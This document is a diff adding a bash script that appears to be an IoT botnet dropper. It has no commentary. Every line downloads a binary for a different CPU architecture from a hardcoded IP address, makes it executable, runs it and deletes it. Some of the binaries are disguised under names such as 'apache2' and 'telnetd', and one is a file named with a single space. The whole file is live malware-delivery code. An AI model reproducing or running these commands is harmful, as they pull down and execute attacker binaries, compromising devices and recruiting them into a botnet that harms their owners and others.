@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.238.199/zombiemips; chmod +x zombiemips; ./zombiemips; rm -rf zombiemips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.238.199/zombiemipsel; chmod +x zombiemipsel; ./zombiemipsel; rm -rf zombiemipsel
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.238.199/zombiesh4; chmod +x zombiesh4; ./zombiesh4; rm -rf zombiesh4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.238.199/zombiex86; chmod +x zombiex86; ./zombiex86; rm -rf zombiex86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.238.199/zombiearmv6l; chmod +x zombiearmv6l; ./zombiearmv6l; rm -rf zombiearmv6l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.238.199/zombiei686; chmod +x zombiei686; ./zombiei686; rm -rf zombiei686
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.238.199/zombieppc; chmod +x zombieppc; ./zombieppc; rm -rf zombieppc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.238.199/zombiei586; chmod +x zombiei586; ./zombiei586; rm -rf zombiei586
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.238.199/zombiem68k; chmod +x zombiem68k; ./zombiem68k; rm -rf zombiem68k
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.238.199/zombiesparc; chmod +x zombiesparc; ./zombiesparc; rm -rf zombiesparc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.238.199/' '; chmod +x ' '; ./' '; rm -rf ' '
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.238.199/apache2; chmod +x apache2; ./apache2; rm -rf apache2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.238.199/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
